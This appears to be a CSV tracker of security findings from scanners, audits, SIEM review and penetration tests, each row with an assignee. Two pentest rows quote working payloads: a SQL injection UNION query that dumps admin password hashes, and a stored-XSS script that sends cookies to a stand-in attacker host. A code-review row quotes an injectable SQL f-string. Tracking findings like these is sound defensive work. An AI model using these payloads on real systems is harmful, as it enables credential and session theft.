finding_id,raw_description,source_tool,date_found,assigned_to
FIND-2026-0142,"CRITICAL: CVE-2024-44308 - Remote code execution vulnerability detected on host 10.0.1.45 (web-prod-01). CVSS Score: 9.8. Exploitable remotely without authentication. Apple WebKit prior to 17.2 allows arbitrary code execution via crafted web content. Affected service: customer-portal nginx fronting WebKit-based rendering microservice. Patch available.",Tenable,2026-03-15,j.martinez@example.com
FIND-2026-0143,"SSL/TLS - Server supports deprecated TLSv1.0 and TLSv1.1 protocols. Host: 192.168.4.22:443. QID: 38628. Severity: 3.",Qualys,2026-03-16,unassigned
FIND-2026-0078,"Authenticated SQL injection discovered in /api/v2/reports/export endpoint via 'sort_by' parameter. Payload: ' UNION SELECT username,password_hash FROM admin_users-- successfully extracted 847 records during testing window. Database: prod_reporting (MySQL 8.0.32). Full DB enumeration possible. Recommend immediate parameterization and WAF rule deployment. See PT-2026-Q1 report section 4.2.",Manual Pentest,2026-02-28,security-team@example.com
FIND-2026-0201,S3 bucket 'acme-corp-mktg-assets-2023' has public-read ACL enabled. Region: us-east-1. Object count: ~12k.,CSPM,2026-04-02,devops-lead
FIND-2026-0089,"12 privileged AD accounts inactive >90 days but still members of Domain Admins group. Accounts: jsmith_admin, contractor_05, svc_legacy_backup, oldadmin_temp, jdoe_da, mwilson_da, intern_2024_sec, ckumar_admin, dba_old, netops_legacy, ehernandez_da, svc_decom_2022. Last login range: 102-447 days.",AD Audit,2026-02-10,k.patel
FIND-2026-0312,"Detected 4,217 failed authentication attempts against VPN gateway vpn.corp.example.com from source IP 185.220.101.45 over 6hr window. Source IP correlates with known TOR exit node (threat intel feed: AlienVault OTX). No successful auth observed. Account targeted: multiple (spray pattern). Action: block + investigate.",SIEM Review,2026-04-18,soc-tier2
FIND-2026-0156,"PII (SSN format pattern \d{3}-\d{2}-\d{4}) detected in outbound email attachment to external gmail.com domain. Sender: payroll-intern@example.com. Attachment: employee_roster_Q1.xlsx (847 rows, 12 columns including DOB and SSN). Policy match: HR-DLP-001. Email was quarantined and is awaiting review.",DLP Policy Review,2026-03-22,compliance@example.com
FIND-2026-0067,"Hardcoded AWS access key found in repository: github.com/acme-corp-internal/data-pipeline-v3 file: src/utils/upload.py line 23. Key prefix AKIAI******. Commit author: former contractor. Repo is private but accessible to 142 contributors. Key still active in AWS account 123456789012 per IAM check.",Code Review,2026-02-05,r.chen
FIND-2026-0188,End-of-life software detected: Apache HTTPD 2.2.15 on linux-db-08 (10.0.3.12). Vendor support ended 2017. No security updates available. Multiple known CVEs apply.,Tenable,2026-03-28,unassigned
FIND-2026-0190,"Missing Microsoft Patch KB5034441 across 38 Windows Server 2019 hosts. CVE-2024-20666 - BitLocker security feature bypass. CVSS: 6.6. Requires physical or local access.",Qualys,2026-03-29,wintel-ops
FIND-2026-0080,"Stored XSS in user profile bio field (POST /profile/update). Payload <script>fetch('//attacker.tld/'+document.cookie)</script> persists and executes for all viewers, including admin users viewing the profile via the internal admin console. Session hijacking demonstrated end-to-end during test on 2026-02-26.",Manual Pentest,2026-02-28,security-team@example.com
FIND-2026-0210,"IAM role 'lambda-data-processor' has wildcard policy attached: Action: *, Resource: *. Used by 7 Lambda functions in production account 123456789012. Trust policy allows assumption by any Lambda in the account.",CSPM,2026-04-05,cloud-sec
FIND-2026-0094,"Kerberoasting risk: 23 service accounts with SPN set and weak password policy applied (no expiration, MinPasswordLength=8, no complexity enforced). Includes high-value: svc_sqlbackup, svc_sharepoint_app, svc_jenkins_prod, svc_ad_sync. Offline crack feasible.",AD Audit,2026-02-12,k.patel
FIND-2026-0334,"Anomalous login: user m.johnson@example.com authenticated to M365 from Lagos, NG at 03:14 UTC; previous session 22min earlier from Dublin, IE. Impossible travel rule triggered. MFA was satisfied via push approval (potential MFA fatigue / push bombing). No mailbox rule changes observed yet.",SIEM Review,2026-04-22,soc-tier2
FIND-2026-0070,"SQL query construction via Python f-string in src/api/customers/lookup_controller.py:88. Line reads f""SELECT * FROM customers WHERE email = '{user_input}'"" - no parameterization, user_input flows directly from authenticated request body. Reachable from GET /api/customers/search.",Code Review,2026-02-06,r.chen
